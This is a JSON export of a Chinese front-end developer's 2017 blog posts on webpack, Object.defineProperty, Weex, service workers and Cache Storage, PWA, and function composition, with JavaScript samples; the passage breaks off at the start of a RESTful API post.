[{"title":"webpack入门&感想","date":"2017-02-23T02:09:04.000Z","path":"2017/02/23/webpack入门-感想/","text":"也许你想在写代码的时候检查自己的js是否符合jshint的规范，那么隆重推荐preLoaders和postLoaders，loaders是webpack的最重要模块，用它来处理各种类型的文件。perLoaders顾名思义就是在loaders执行之前处理的，webpack的处理顺序是perLoaders - loaders - postLoaders。 另外，这两天把服务器从apache迁移到了nginx，nginx的反向代理功能确实非常有用，现在已经把原本监听8080端口的NodeJs服务都反响代理到了80端口，这样一来我的HTTPS证书相当于在8080端口也能起效了。","tags":[]},{"title":"Object.defineProperty怎么玩","date":"2017-02-21T01:21:22.000Z","path":"2017/02/21/Object-defineProperty怎么玩/","text":"原文转载地址http://imweb.io/topic/56d40adc0848801a4ba198ce Object.defineProperty ，顾名思义，为对象定义属性。在js中我们可以通过下面这几种方法定义属性 123456789101112// (1) define someOne property namesomeOne.name = &apos;cover&apos;;//or use (2) someOne[&apos;name&apos;] = &apos;cover&apos;;// or use (3) definePropertyObject.defineProperty(someOne, &apos;name&apos;, &#123; value : &apos;cover&apos;&#125;) 从上面看，貌似使用Object.defineProperty很麻烦，那为啥存在这样的方法呢？带着疑问，我们来看下 Object.defineProperty的定义。 先来看下MDN对defineProperty的定义： The Object.defineProperty() method defines a new property directly on an object, or modifies an exisiting property on an object, and returns the object. 从上面得知，我们可以通过Object.defineProperty这个方法，直接在一个对象上定义一个新的属性，或者是修改已存在的属性。最终这个方法会返回该对象。 ##语法object.defineProperty(object, propertyname, descriptor) ##参数 object 必需。 要在其上添加或修改属性的对象。 这可能是一个本机 JavaScript对象（即用户定义的对象或内置对象）或 DOM 对象。 propertyname 必需。 一个包含属性名称的字符串。 descriptor 必需。 属性描述符。 它可以针对数据属性或访问器属性。 其中descriptor的参数值得我们关注下,该属性可设置的值有： 【value】 属性的值，默认为 undefined。 【writable】 该属性是否可写，如果设置成 false，则任何对该属性改写的操作都无效（但不会报错），对于像前面例子中直接在对象上定义的属性，这个属性该特性默认值为为 true。 12345678var someOne = &#123; &#125;;Object.defineProperty(someOne, &quot;name&quot;, &#123; value:&quot;coverguo&quot; , //由于设定了writable属性为false 导致这个量不可以修改 writable: false &#125;); console.log(someOne.name); // 输出 coverguosomeOne.name = &quot;linkzhu&quot;;console.log(someOne.name); // 输出coverguo 【configurable]】如果为false，则任何尝试删除目标属性或修改属性以下特性（writable, configurable, enumerable）的行为将被无效化，对于像前面例子中直接在对象上定义的属性，这个属性该特性默认值为为 true。 123456789var someOne = &#123; &#125;;Object.defineProperty(someOne, &quot;name&quot;, &#123; value:&quot;coverguo&quot; , configurable: false &#125;); delete someOne.name; console.log(someOne.name);// 输出 coverguosomeOne.name = &quot;linkzhu&quot;;console.log(someOne.name); // 输出coverguo 【enumerable】 是否能在for-in循环中遍历出来或在Object.keys中列举出来。对于像前面例子中直接在对象上定义的属性，这个属性该特性默认值为为 true。 注意 在调用Object.defineProperty()方法时，如果不指定， configurable， enumerable， writable特性的默认值都是false,这跟之前所 说的对于像前面例子中直接在对象上定义的属性，这个特性默认值为为 true。并不冲突，如下代码所示： 12345678910111213//调用Object.defineProperty()方法时，如果不指定var someOne = &#123; &#125;;someOne.name = &apos;coverguo&apos;;console.log(Object.getOwnPropertyDescriptor(someOne, &apos;name&apos;));//输出 Object &#123;value: &quot;coverguo&quot;, writable: true, enumerable: true, configurable: true&#125;//直接在对象上定义的属性，这个特性默认值为为 truevar otherOne = &#123;&#125;;Object.defineProperty(otherOne, &quot;name&quot;, &#123; value:&quot;coverguo&quot; &#125;); console.log(Object.getOwnPropertyDescriptor(otherOne, &apos;name&apos;));//输出 Object &#123;value: &quot;coverguo&quot;, writable: false, enumerable: false, configurable: false&#125; 从上面，可以得知，我们可以通过使用Object.defineProperty，来定义和控制一些特殊的属性，如属性是否可读，属性是否可枚举，甚至修改属性的修改器（setter）和获取器(getter)那什么场景和地方适合使用到特殊的属性呢？ ###实际运用在一些框架，如vue、express、qjs等，经常会看到对Object.defineProperty的使用。那这些框架是如何使用呢？ ##MVVM中数据‘双向绑定’实现","tags":[]},{"title":"蒙托卡罗模拟算法计算面积","date":"2017-02-17T06:06:05.000Z","path":"2017/02/17/蒙托卡罗模拟算法计算面积/","text":"给大家看一个小学数学题，这个怎么来做呢？ 当然，这道题可以用纯数学的方式来做，比如加一条辅助线 但是呢，其实可以尝试一下启发式算法：蒙特卡洛模拟 它的具体定义是： 在广场上画一个边长一米的正方形，在正方形内部随意用粉笔画一个不规则的形状，现在要计算这个不规则图形的面积，怎么计算列?蒙特卡洛(Monte Carlo)方法告诉我们，均匀的向该正方形内撒N（N是一个很大的自然数）个黄豆，随后数数有多少个黄豆在这个不规则几何形状内部，比如说有M个，那么，这个奇怪形状的面积便近似于M/N，N越大，算出来的值便越精确。在这里我们要假定豆子都在一个平面上，相互之间没有重叠。…蒙特卡洛方法可用于近似计算圆周率：让计算机每次随机生成两个0到1之间的数，看这两个实数是否在单位圆内。生成一系列随机点，统计单位圆内的点数与总点数，（圆面积和正方形面积之比为PI:1，PI为圆周率），当随机点取得越多（但即使取10的9次方个随机点时，其结果也仅在前4位与圆周率吻合）时，其结果越接近于圆周率。 上JS代码：12345678910111213141516171819202122232425262728293031323334/** * 给图形画一个坐标,检测(x,y)点是否落入阴影区域部分 * @param &#123;float&#125; x 横坐标 * @param &#123;float&#125; y 纵坐标 * @returns &#123;boolean&#125; 落入阴影:true,否则:false */var detectFallIn = function (x, y) &#123; return (x / y &lt; 2 || x &lt; 5) ? false : (Math.sqrt(Math.pow(x - 5, 2) + Math.pow(y - 5, 2)) &gt;= 5 &amp;&amp; Math.sqrt(Math.pow(x - 15, 2) + Math.pow(y - 5, 2)) &gt;= 5);&#125;;/** * 利用「蒙特卡洛方法」计算阴影(不规则图形)部分的面积 * @param &#123;int&#125; soyaNums 黄豆的数量 */var calShadowArea = function (soyaNums) &#123; var x, y, fallIn = 0; for (var i = 0; i &lt;= soyaNums; i++) &#123; // 将黄豆随机洒落到长方形中 x = Math.random() * 20; y = Math.random() * 10; // 判断黄豆是否落入阴影区域 if (detectFallIn(x, y)) &#123; fallIn++; &#125; &#125; // 阴影面积 var shadow = 20 * 10 * (fallIn / soyaNums); console.log(&apos;shadow area = &apos;, shadow);&#125;; calShadowArea(300);calShadowArea(3000);calShadowArea(30000);calShadowArea(300000);calShadowArea(3000000);calShadowArea(30000000);calShadowArea(300000000); soyaNums越大，答案就越接近正确结果","tags":[{"name":"其他","slug":"其他","permalink":"https://ganchengyuan1990.github.io/blog/tags/其他/"}]},{"title":"Weex首秀","date":"2017-02-16T05:54:46.000Z","path":"2017/02/16/Weex首秀/","text":"第一部分 2017-01-25一直想做一个APP，去年也自学过一段时间的React Native, 但是RN相对来说学习曲线比较陡峭，并且很多资源包在下载时都不是那么容易，经常error（这个大家都懂）, 所以这事儿就不了了之了。 前两天看了weex的会议，觉得阿里又在放大招了，这个工具虽然目前学习社区不多，资源组件不丰富，但是本身调式来发非常便捷，weex playground非常不错，并且因为weex是基于vue的，所以入门简单，npm run build打包以后部署到自己的服务器上，用二维码扫描以后就可以拥有一个自己的APP了，并且是兼容三端的，这一点非常诱人。 于是，我就从github上找到了一个别人的项目，https://github.com/dodola/WeexOne，然后改造一个属于自己的APP。总体样式如下： 开始动手！ 首先，引入了picker组件，这个组件用来进行时间选择，前端效果不错。1234567891011121314151617181920require('weex-components'); const picker = require('@weex-module/picker'); export default &#123; data () &#123; return &#123; value: '' &#125; &#125;, methods: &#123; pickTime () &#123; picker.pickTime(&#123; value: this.value &#125;, event =&gt; &#123; if (event.result === 'success') &#123; this.value = event.data &#125; &#125;) &#125; &#125; &#125; 第二部分 2017-02-03首先祝各位鸡年大吉，开工大吉！趁着今天刚开工，工作任务还不多，可以继续学些Weex。 春节在家无聊的时候，继续跟进了一下Weex的学习，主要把“关于我”这个Page进行了一些优化，这里主要是一些体力活，并没有太多可说的，简单总结以下几点： Weex中所有的文字都要放在这个标签里，在普通的网页开发甚至Vue开发中，我偶尔会直接把文字放在div标签里，但是Weex中并不识别这样的语法。 Weex的页面布局虽然也使用css语法，但是与Vue以及普通页面并不完全相同，我试验了一下，text-align：center必须用在text标签上，才能使文字居中，但是因为HTML并没有这个标签，所以要加载文字所在的父标签上，这个要注意，另外就是建议在Weex中多应用flex布局。 外部链接问题在“关于我”这个page中，有一个需求，就是链接到外部网站，因为之前缺少APP开发经验，所以我想当然地认为这个问题非常简单，只需要价格a标签，或者像Vue一样采用Router的方法就可以了，但是后来发现这样并不能正常work。 仔细一看，Demo中所有Router都是链接到项目内部页面的，看地址栏上每个页面其实都是一个经过build的Js文件，这点应该和Vue是类似的，但这个并不符合我的需求，并且外部网站是传统的静态页面，因此还是需要解决。 首先抓包看看访问的URL是否正确:由上图看 http://m.feiniu.com/my/order/index.html 这个请求地址应该没有错，所以有可能是兼容问题。 于是尝试捕捉error123456789101112 &lt;web class=\"content\" id=\"webview\" src='https://m.taobao.com/?spm=0.0.0.0&amp;v=0#index' onpagestart=\"startload\" onpagefinish=\"finishload\" onerror=\"failload\"&gt;&lt;/web&gt;startload: function(e) &#123; modal.toast(&#123; message: 'pagestart' &#125;)&#125;,finishload: function(e) &#123; modal.toast(&#123; message: 'finishload' &#125;)&#125;,failload: function(event) &#123; modal.toast(&#123; message: event &#125;)&#125; 使用不同的机器进行测试，安卓手机触发到了finishload事件，而IPHONE触发了failload事件，但是两个手机都无法正常显示网页。 最后我在官方文档中查到这个：web组件要求的weex版本是v0.5+，但是我的项目中用的是v0.32的，所以说看起来还是得仔细查查手册啊，之前在Vue项目中也碰到过这种组件兼容性问题。目前怀疑就是这个问题导致无法正常使用webview（未完待续）。 第三部分 2017-02-16在Weex中，不能直接像HTML中那样用a标签链接打开一个页面，也无法使用Router进行路由，因此需要用到Webview。 Weex官方提供了一个web组件：1&lt;web class=&quot;content&quot; id=&quot;webview&quot; src=&apos;https://ganchengyuan1990.github.io/blog/&apos; onpagestart=&quot;startload&quot; onpagefinish=&quot;finishload&quot; onerror=&quot;failload&quot;&gt;&lt;/web&gt; 要注意的一点是，在本地server中无法正常在webview中打开页面，但是部署到服务器就好了。然后打包部署提交到服务器以后看，就OK啦： 这样一来，就把自己的博客给嵌入到APP中啦，感觉不错。 所以说总结起来就是一句话，要多看官方文档，接下来的事儿，就是多在不同环境里试试。","tags":[{"name":"Vue","slug":"Vue","permalink":"https://ganchengyuan1990.github.io/blog/tags/Vue/"}]},{"title":"微信面试题--lazyMan实现","date":"2017-02-14T02:14:51.000Z","path":"2017/02/14/微信面试题-lazyMan实现/","text":"今天来写一个LazyMan，实际就是熟悉一下ES6和Promise对象的语法，实现一个简单的队列。 直接上代码: 123456789101112131415161718192021222324252627282930313233343536373839class C &#123; constructor(name) &#123; this.tasks = []; setTimeout(() =&gt; this.next()); return this.push(() =&gt; new Promise(r =&gt; console.log(`Hi! This is $&#123;name&#125;`) || r())); &#125; next() &#123; let task = this.tasks.shift(); task &amp;&amp; task().then(() =&gt; this.next()); &#125; push (v) &#123; this.tasks.push(v); return this; &#125; unshift(v) &#123; this.tasks.unshift(v); return this; &#125; sleep (sec) &#123; return this.push(() =&gt; new Promise(r =&gt; console.log(`//等待$&#123;sec&#125;秒..`) || setTimeout(() =&gt; console.log(`Wake up after $&#123;sec&#125;`) || r(), 1000 * sec))); &#125; sleepFirst (sec) &#123; return this.unshift(() =&gt; new Promise(r =&gt; console.log(`//等待$&#123;sec&#125;秒..`) || setTimeout(() =&gt; console.log(`Wake up after $&#123;sec&#125;`) || r(), 1000 * sec))); &#125; eat (name) &#123; return this.push(() =&gt; new Promise(r =&gt; console.log(`Eat $&#123;name&#125;`) || r())); &#125;&#125;const LazyMan = function (name) &#123; return new C(name);&#125;setTimeout(() =&gt; console.log('123232323') || LazyMan('Hank').sleep(10).eat('dinner'), 2000);","tags":[]},{"title":"阿里云服务器NodeJs部署小问题","date":"2017-02-10T02:41:46.000Z","path":"2017/02/10/HTTP协议状态码/","text":"今天在写自己的小项目。遇到一个问题。 用nodejs写的后端，Vue前端，后端逻辑非常简单，就是从第三方接口查信息，然后通过Mongodb存储到本地数据库，并且把信息返回。 这个工作只花了20分钟就在本地测试通过了，然后开始部署到自己的阿里云服务器上。结果上去以后就有问题，获取不到！ 写的是一个Jsonp的跨域请求，但其实已经不是跨域了，因为请求发起地址是”http://jasongan.cn/&quot;，response地址是&quot;http://jasongan.cn:9001&quot;。 在node.js中也写了header，启用了CORS来应对跨域问题 res.setHeader(‘Access-Control-Allow-Origin’, ‘*’); res.setHeader(‘Access-Control-Allow-Headers’, ‘Origin, X-Requested-With, Content-Type, Accept’); 这都没什么奇怪的，问题是让我把测试机通过公司的代理服务器再发HTTP请求时，居然获得了response！ 来看一下此时HTTP的请求信息123456789101112131415161718192021222324252627282930Request URL:http://jasongan.cn:9001/?callback=_jsonprjvoxbwo27h0lgel5a0s5rk9Request Method:GETStatus Code:200 OKRemote Address:10.200.70.3:8080Response Headersview sourceAccess-Control-Allow-Headers:Origin, X-Requested-With, Content-Type, AcceptAccess-Control-Allow-Methods:PUT, POST, GET, DELETE, OPTIONSAccess-Control-Allow-Origin:*Connection:keep-aliveContent-Length:184Date:Fri, 10 Feb 2017 06:44:54 GMTVia:1.1 proxy3.fn.com (squid/3.4.4)X-Cache:MISS from proxy3.fn.comX-Cache-Lookup:MISS from proxy3.fn.com:8080Request Headersview sourceAccept:*/*Accept-Encoding:gzip, deflate, sdchAccept-Language:zh-CN,zh;q=0.8Cache-Control:no-cacheHost:jasongan.cn:9001Pragma:no-cacheProxy-Connection:keep-aliveReferer:http://jasongan.cn/User-Agent:Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1callback:_jsonprjvoxbwo27h0lgel5a0s5rk9 Response Headers里X-Cache表示你的 http request 是由 proxy server 回的 .MISS 表 proxy无资料,代理动作, HIT 表 proxy 直接回应。 最后发现，自己的阿里云服务器如果要开启nodejs服务，默认是监听8080端口的，因此改成response地址http://jasongan.cn:8080就可以了。而因为公司代理服务器的端口也恰好是8080，所以才可以。","tags":[{"name":"网络相关","slug":"网络相关","permalink":"https://ganchengyuan1990.github.io/blog/tags/网络相关/"}]},{"title":"Cache Storage如何可控","date":"2017-02-09T01:40:03.000Z","path":"2017/02/09/Cache-Storage如何可控/","text":"昨天尝试给自己的Github Page使用了service worker工具，从而更好地利用和控制缓存，其中代码中有一段： 1234567891011121314151617181920event.respondWith(//If request is already in cache, return itcaches.match(request).then((response) =&gt; &#123; if (response) &#123; return response; &#125; //if request is not cached, add it to cache return fetch(request).then((response) =&gt; &#123; var responseToCache = response.clone(); caches.open(cacheName).then((cache) =&gt; &#123; cache.put(request, responseToCache).catch((err) =&gt; &#123; console.warn(request.url + ': ' + err.message); &#125;); &#125;); return response; &#125;);&#125;)); 这段代码会判断request请求是否命中了缓存，如果是就直接使用缓存，response同理。 那么，这个caches就成了关键。它是如何work的呢？其实这个caches就是Cache Storage，它存在全局变量window中，因此无需定义可直接调用。 我们从一个简单的DEMO中来看它的使用方式： 12345678910111213141516caches.delete('c1');caches.delete('c2');Promise.all([ caches.open('c1').then(function(cache) &#123; return cache.put('/hehe', new Response('aaa', &#123; status: 200 &#125;)); &#125;), caches.open('c2').then(function(cache) &#123; return cache.put('/hehe', new Response('bbb', &#123; status: 200 &#125;)); &#125;)]).then(function() &#123; return caches.match('/hehe');&#125;).then(function(response) &#123; return response.text();&#125;).then(function(body) &#123; console.log(body);&#125;); 首先，在 caches 上调用 open 方法就可以异步地得到一个 Cache 对象的引用。在这个对象上我们可以把 Response 对象 put 进去（参数是一个 URL 和一个 Response 对象）、用 match 方法取出（传入一个 URL 取出对应的 Response 对象）。match 方法不仅可以在 Cache 上调用 CacheStorage 上也有 match 方法，比如上面例子就打开了两个 Cache，都写入一个叫 /hehe 的 URL。在写入操作完成之后，到外部的 CacheStorage 上调用 match 方法来匹配 /hehe，结果是随机的（没找到这个规则在哪里定义的）。 虽然上面的例子中只对 Cache 对象 put 了一个数据，而 Cache 对象本身可以存放更多的 URL/Response 对。并且提供了 delete（用户删除）、keys（用于遍历）等方法。但是 Cache 并不像 localStorage 一样有 clear 方法，如果非要清空一个 Cache，可以直接在 CacheStorage 上把整个 Cache 给 delete 掉再重新 open。这套 API 和 ServiceWorker 一家的，它通常被用于 ServiceWorker 中，整个设计风格也和 ServiceWorker 一样都基于 Promise。","tags":[{"name":"Javacsript","slug":"Javacsript","permalink":"https://ganchengyuan1990.github.io/blog/tags/Javacsript/"}]},{"title":"PWA初体验","date":"2017-02-07T01:33:22.000Z","path":"2017/02/07/PWA初体验/","text":"白屏以及离线不可用，是Web App最大的体验问题。据说，PWA是解决这两大问题的曙光。 那么，就很有必要来了解试用一下这玩意儿。 OK, 程序员的好习惯之一是使用Github，搜索”pwa demo” 按照md来进行安装和部署之后，按照要求来试玩（因为下载不到chrome canary版本，暂用普通的Chrome来测试）： Step 1: Go offline.(切离线环境)Step 2: Register BG Sync from above register button.(点击页面上注册按钮)Step 3: Enter a git username and click add.(输入github用户名)Step 4: Go online and sync will be triggered when user is gets connectivity and card will be updated.(切上线环境以后刷新) 试用以后并不能work. 因此简单修改步骤: Step 1: 线上环境首先搜索一个github用户名。Step 2: 获得结果以后切离线环境。Step 3: 点击注册按钮。Step 4: 离线环境下搜索同一个用户名，正常来说无法访问，但是同样可以获得正确结果。 为何如此神奇呢？上图是HTTP Response头部信息，看起来这个serviceWorker是重点 先看一段定义 一个 service worker 是一段运行在浏览器后台进程里的脚本，它独立于当前页面，提供了那些不需要与web页面交互的功能在网页背后悄悄执行的能力。在将来，基于它可以实现消息推送，静默更新以及地理围栏等服务，但是目前它首先要具备的功能是拦截和处理网络请求，包括可编程的响应缓存管理。 接着看代码：1234567891011121314151617181920212223242526272829//Adding `fetch` event listenerself.addEventListener('fetch', (event) =&gt; &#123; console.info('Event: Fetch'); var request = event.request; //Tell the browser to wait for newtwork request and respond with below event.respondWith( //If request is already in cache, return it caches.match(request).then((response) =&gt; &#123; if (response) &#123; return response; &#125; //if request is not cached, add it to cache return fetch(request).then((response) =&gt; &#123; var responseToCache = response.clone(); caches.open(cacheName).then((cache) =&gt; &#123; cache.put(request, responseToCache).catch((err) =&gt; &#123; console.warn(request.url + ': ' + err.message); &#125;); &#125;); return response; &#125;); &#125;) );&#125;); 可以看到，全局变量有一个监听器，监听fetch事件，而这边的fetch就是获取API的工作，从上面(If request is already in cache, return it)可以看出如果命中了缓存中的request，就直接使用缓存，response同理。 从下面的代码中可以看到，如果处于offline状态，请求参数会先存在localStorage中，然后sync事件会激活，从而再去发送请求 .catch(function (error) { //If user is offline and sent a request, store it in localStorage //Once user comes online, trigger bg sync fetch from application tab to make the failed request localStorage.setItem(‘request’, name); spinnerElement.classList.remove(‘show’); //hide spinner console.error(error); }); 123456789101112131415161718self.addEventListener('sync', (event) =&gt; &#123; console.info('Event: Sync'); //Check registered sync name or emulated sync from devTools if (event.tag === 'github' || event.tag === 'test-tag-from-devtools') &#123; event.waitUntil( //To check all opened tabs and send postMessage to those tabs self.clients.matchAll().then((all) =&gt; &#123; return all.map((client) =&gt; &#123; return client.postMessage('online'); //To make fetch request, check app.js - line no: 122 &#125;) &#125;) .catch((error) =&gt; &#123; console.error(error); &#125;) ); &#125;&#125;); 这样来看，必须了解一下serviceWorker的工作原理与使用方法了，阅读文章大有收获https://www.w3ctech.com/topic/866 根据以上文章可以在自己的Github Page中应用Service Worker，大家可以看看我的Blog，现已开启服务https://ganchengyuan1990.github.io/blog/。 值得注意的是，目前只有HTTPS协议下可以使用Service Worker，而Github Page服务器上使用的就是HTTPS协议，所以最合适用来试验。另外，如果所有第三方资源(包括图片)最好也使用HTTPS协议，否则就会有报错，无法正常显示。办法之一就是把图片资源都放在Github Page服务器上。","tags":[]},{"title":"今日休整，简单修改样式","date":"2017-02-06T06:53:02.000Z","path":"2017/02/06/今日休整，简单修改样式/","text":"如题，今日没有阅读到特别好的文章，简单记两笔。 首先，把Theme优化了一下，给头像图片以及文章DOM加了动画，不得不说Hexo还是非常友好的工具，二次开发比较方便，但是在npm install时出现了一些问题，暂时没有找到合适的解，现已上github发帖询问 https://github.com/sass/node-sass/issues/1884。 1234567891011121314151617npm ERR! node-sass@3.13.1 postinstall: `node scripts/bunpm ERR! Exit status 1npm ERR!npm ERR! Failed at the node-sass@3.13.1 postinstall scrnpm ERR! Make sure you have the latest version of node.npm ERR! If you do, this is most likely a problem withnpm ERR! not with npm itself.npm ERR! Tell the author that this fails on your systemnpm ERR! node scripts/build.jsnpm ERR! You can get information on how to open an issunpm ERR! npm bugs node-sassnpm ERR! Or if that isn&apos;t available, you can get theirnpm ERR! npm owner ls node-sassnpm ERR! There is likely additional logging output abovnpm ERR! Please include the following file with any supnpm ERR! D:\\nodejs\\hexo\\themes\\yilia\\npm-debug.log 另外，上午读到一篇不错的文章，关于Jquery-free的一些技巧，的确从目前来看原生Js能力是一个进阶前端开发者的必备技能，DOM样式修改可以最先研究。 12345678910111213141516171819202122232425262728293031323334//使用原生方法来获取element的CSS(function(WDS, undefined)&#123; function _camelize(property) &#123; return property.replace(/-(\\w)/g, function (strMatch, p1)&#123; return p1.toUpperCase(); &#125;); &#125; function getStyle(element, property) &#123; if(property =='background') property = \"background-color\"; if(!element || !property) return false; //首先获取内联样式 var value = element.style[_camelize(property)]; if(!value) &#123; if(document.defaultView &amp;&amp; document.defaultView.getComputedStyle)&#123; css = document.defaultView.getComputedStyle(element, null); return value = css ? css.getPropertyValue(property) : null; &#125; &#125; &#125; window.WDS.getStyle = getStyle;&#125;)(window.WDS || (window.WDS = &#123;&#125;));console.log(WDS.getStyle(document.getElementsByClassName('profilepic')[0], \"background\")); 最后，下载了Snapchat玩了一下，挺有意思，大家加个朋友https://www.snapchat.com/add/jasongan0915","tags":[]},{"title":"ZT-函数式编程","date":"2017-02-04T01:48:39.000Z","path":"2017/02/04/函数式编程/","text":"转帖：http://www.zcfy.cc/article/master-the-javascript-interview-what-is-function-composition-2160.html 函数式编程正在接管 JavaScript 世界。就在几年前，只有少数 JavaScript 程序员知道函数式编程是什么。然而，在过去 3 年内，我所看到的每个大型应用程序代码库都大量用到了函数式编程理念。 函数组合就是组合两到多个函数来生成一个新函数的过程。将函数组合在一起，就像将一连串管道扣合在一起，让数据流过一样。 简而言之，函数 f 和 g 的组合可以被定义为 f(g(x))，从内到外（从右到左）求值。也就是说，求值顺序是： 1.x 2.g 3.f 下面我们在代码中更近距离观察一下这个概念。假如你想把用户的全名转换为 URL Slug，给每个用户一个个人信息页面。为了实现此需求，你需要经历一连串的步骤： 1.将姓名根据空格分拆（split）到一个数组中 2.将姓名映射（map）为小写 3.用破折号连接（join） 4.编码 URI 组件 如下是一个简单的实现：12345const toSlug = input =&gt; encodeURIComponent( input.split(' ') .map(str =&gt; str.toLowerCase()) .join('-')); 还不赖…但是假如我告诉你可读性还可以更强一点会怎么样呢？ 假设每个操作都有一个对应的可组合的函数。上述代码就可以被写为： 1234567891011const toSlug = input =&gt; encodeURIComponent( join('-')( map(toLowerCase)( split(' ')( input ) ) )); console.log(toSlug('JS Cheerleader')); // 'js-cheerleader' 这看起来比我们的第一次尝试更难读懂，但是先忍一下，我们就要解决。 为了实现上述代码，我们将组合几种常用的工具，比如 split()、join() 和 map()。如下是实现： 123456789const curry = fn =&gt; (...args) =&gt; fn.bind(null, ...args); const map = curry((fn, arr) =&gt; arr.map(fn)); const join = curry((str, arr) =&gt; arr.join(str)); const toLowerCase = str =&gt; str.toLowerCase(); const split = curry((splitOn, str) =&gt; str.split(splitOn)); 除了 toLowerCase() 外，所有这些函数经产品测试的版本都可以从 Lodash/fp 中得到。可以像这样导入它们(类似vue的语法)： import { curry, map, join, split } from ‘lodash/fp’; 也可以用CommonJS模式引入： const curry = require(‘lodash/fp/curry’);const map = require(‘lodash/fp/map’); 这里我偷了点懒。注意这个 curry 从技术上来说，并不是一个真正的柯里化函数。真正的柯里化函数总会生成一个一元函数。这里的 curry 只是一个偏函数应用。请参考“柯里化和偏函数应用之间的区别是什么？”这篇文章。不过，这里只是为了演示用途，我们就把它当作一个真正的柯里化函数好了。回到我们的 toSlug() 实现，这里有一些东西真的让我很烦： 1234567891011const toSlug = input =&gt; encodeURIComponent( join('-')( map(toLowerCase)( split(' ')( input ) ) )); console.log(toSlug('JS Cheerleader')); // 'js-cheerleader' 对我来说，这里的嵌套太多了，读起来有点让人摸不着头脑。我们可以用一个会自动组合这些函数的函数来扁平化嵌套，就是说，这个函数会从一个函数得到输出，并自动将它传递给下一个函数作为输入，直到得到最终值为止。 细想一下，好像数组中有一个函数可以做差不多的事情。这个函数就是 reduce()，它用一系列值为参数，对每个值应用一个函数，最后累加成一个结果。值本身也可以函数。但是 reduce() 是从左到右递减，为了匹配上面的组合行为，我们需要它从右到左缩减。 好事情是刚好数组也有一个 reduceRight() 方法可以干这事： const compose = (…fns) =&gt; x =&gt; fns.reduceRight((v, f) =&gt; f(v), x); 像 .reduce() 一样，数组的 .reduceRight() 方法带有一个 reducer 函数和一个初始值（x）为参数。我们可以用它从右到左迭代数组，将函数依次应用到每个数组元素上，最后得到累加值（v）。 用 compose，我们就可以不需要嵌套来重写上面的组合：12345678const toSlug = compose( encodeURIComponent, join('-'), map(toLowerCase), split(' ')); console.log(toSlug('JS Cheerleader')); // 'js-cheerleader' 当然，lodash/fp 也提供了 compose()： import { compose } from ‘lodash/fp’; 当以数学形式的组合从内到外的角度来思考时，compose 是不错的。不过，如果想以从左到右的顺序的角度来思考，又该怎么办呢？ 还有另外一种形式，通常称为 pipe()。Lodash 称之为 flow(): 12345678const pipe = (...fns) =&gt; x =&gt; fns.reduce((v, f) =&gt; f(v), x); const fn1 = s =&gt; s.toLowerCase();const fn2 = s =&gt; s.split('').reverse().join('');const fn3 = s =&gt; s + '!' const newFunc = pipe(fn1, fn2, fn3);const result = newFunc('Time'); // emit! 可以看到，这个实现与 compose() 几乎完全一样。唯一的不同之处是，这里是用 .reduce()，而不是 .reduceRight()，即是从左到右缩减，而不是从右到左。 下面我们来看看用 pipe() 实现的 toSlug() 函数： 12345678const toSlug = pipe( split(' '), map(toLowerCase), join('-'), encodeURIComponent); console.log(toSlug('JS Cheerleader')); // 'js-cheerleader' 对于我来说，这要更容易读懂一些。 骨灰级的函数式程序员用函数组合定义他们的整个应用程序。而我经常用它来消除临时变量。仔细看看 pipe() 版本的 toSlug()，你会发现一些特殊之处。 在命令式编程中，在一些变量上执行转换时，在转换的每个步骤中都会找到对变量的引用。而上面的 pipe() 实现是用无点的风格写的，就是说完全找不到它要操作的参数。 我经常将管道（pipe）用在像单元测试和 Redux 状态 reducer 这类事情上，用来消除中间变量。中间变量的存在只用来保存一个操作到下一个操作之间的临时值。 这玩意开始听起来会比较古怪，不过随着你用它练习，会发现在函数式编程中，你是在和相当抽象、广义的函数打交道，而在这样的函数中，事物的名称没那么重要。名称只会碍事。你会开始把变量当作是多余的样板。 就是说，我认为无点风格可能会被用过头。它可能会变得太密集，较难理解。但是如果你搞糊涂了，这里有一个小窍门…你可以利用 flow 来跟踪是怎么回事： 1234const trace = curry((label, x) =&gt; &#123; console.log(`== $&#123; label &#125;: $&#123; x &#125;`); return x;&#125;); 如下是你用它来跟踪的方法： 12345678910111213const toSlug = pipe( trace('input'), split(' '), map(toLowerCase), trace('after map'), join('-'), encodeURIComponent); console.log(toSlug('JS Cheerleader'));// '== input: JS Cheerleader'// '== after map: js,cheerleader'// 'js-cheerleader' trace() 只是更通用的 tap() 的一种特殊形式，它可以让你对流过管道的每个值执行一些行为。明白了么？管道（Pipe）？水龙头(Tap)？可以像下面这样编写 tap()： const tap = curry((fn, x) =&gt; { fn(x); return x;}); 现在你可以看到为嘛 trace() 只是一个特殊情况下的 tap() 了： const trace = label =&gt; { return tap(x =&gt; console.log(== ${ label }: ${ x }));}; 你应该开始对函数式编程是什么样子，以及偏函数应用和柯里化如何与函数组合协作，来帮助你编写可读性更强的程序有点感觉了。","tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ganchengyuan1990.github.io/blog/tags/Javascript/"}]},{"title":"ZT-javascript小技巧","date":"2017-01-24T02:52:27.000Z","path":"2017/01/24/javascript小技巧/","text":"计算最小值12345function smallest(array) &#123; return Math.min.apply(Math, array);&#125;console.log(smallest([9,13,7,8,33])); //7 巧用call方法1234567function useCall() &#123; [].forEach.call(arguments, function(val, key) &#123; console.log(key, val) &#125;);&#125;useCall(&apos;Bob Dylan&apos;, &apos;Bob Marley&apos;, &apos;Steve Vai&apos;);//Bob Dylan, Bob Marley, Steve Vai 如何理解Vue中的setter和getter1234567891011121314151617181920212223242526272829303132333435363738var Coder = function() &#123; var that = this; return &#123; get name()&#123; if(that.name)&#123; return that.name &#125; return '你还没有取名' &#125;, set name(val)&#123; console.log('你把名字修成了'+val) that.name = val &#125; &#125; &#125; var isMe = new Coder() console.log(isMe.name) isMe.name = '周神' console.log(isMe.name) console.log(isMe)var Coder = function() &#123; &#125; Coder.prototype.__defineGetter__('name', function() &#123; if (this.name) &#123; return this.name &#125;else&#123; return '你还没有取名' &#125; &#125;) Coder.prototype.__defineSetter__('name', function(val) &#123; this.name = val &#125;) var isMe = new Coder() console.log(isMe.name) isMe.name = '周神' console.log(isMe.name) console.log(isMe)","tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ganchengyuan1990.github.io/blog/tags/Javascript/"}]},{"title":"ZT-Restful API初识","date":"2017-01-24T01:57:30.000Z","path":"2017/01/24/Restful-API初识/","text":"转载：http://scarletsky.github.io/2016/11/30/error-handling-in-restful-api/ Restful 